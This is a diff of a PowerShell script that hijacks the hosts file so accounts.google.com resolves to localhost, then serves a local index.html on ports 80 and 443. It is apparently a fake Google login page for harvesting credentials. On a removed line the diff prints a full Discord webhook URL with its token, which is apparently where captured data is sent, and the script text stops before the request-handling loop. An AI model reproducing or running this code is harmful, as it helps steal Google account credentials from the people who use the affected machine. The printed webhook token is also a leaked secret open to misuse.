@@ -1,17 +1,17 @@
 $hostString = "127.0.0.1 accounts.google.com";
-$isModified = $result = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;
+$isModified = Select-String C:\Windows\System32\Drivers\etc\hosts -Pattern $hostString;
 
-if ($isModified -eq $null) {    
+if ($null -eq $isModified ) {    
     Add-Content C:\Windows\System32\Drivers\etc\hosts ("`n"+$hostString);
     ipconfig /flushdns;
 }
 
-$url = 'http://127.0.0.1/';
-$hook="https://discord.com/api/webhooks/1123168546948649121/s1tdChwhC_S3siJNkEzw-cBcavztR-TYLoFaryoJ2XbHXdN1U4jQMFcfcjnIdIKfEQdg";
+$url = 'http://127.0.0.1';
+$hook="";
 $pageCode = Get-Content "index.html" -Encoding UTF8 -Raw;
 $http = New-Object System.Net.HttpListener;
-$http.Prefixes.Add("http://127.0.0.1/");
-$http.Prefixes.Add("https://127.0.0.1/");
+$http.Prefixes.Add($url + ':80/');
+$http.Prefixes.Add($url + ':443/');
 $http.Start();
 
 while ($http.IsListening) {
